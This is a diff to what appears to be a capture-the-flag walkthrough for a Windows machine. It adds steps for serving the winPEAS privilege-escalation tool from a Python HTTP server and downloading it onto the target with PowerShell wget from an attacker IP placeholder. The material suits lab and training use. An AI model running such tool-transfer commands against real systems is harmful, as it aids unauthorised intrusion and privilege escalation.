@@ -133,10 +133,20 @@ The user flag is in the user's Desktop.
 Is Windows Local Privilege Escalation Vector tool .
 Download [Link](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 
+Transfer winPEAS to the target machine using Python HTTP server.
+
 > Simple HTTP Server
 ```bash
 $ sudo python3 -m http.server 80
 ```
+
+On the Target Machine, execute wget in order to download the program from the Local Machine. Use powershell to do this process.
+```bash
+powershell
+wget http://@IP/winPEASx64.exe -outfile winPEASx64.exe
+```
+[//]: User must have perm
+
 
 
 
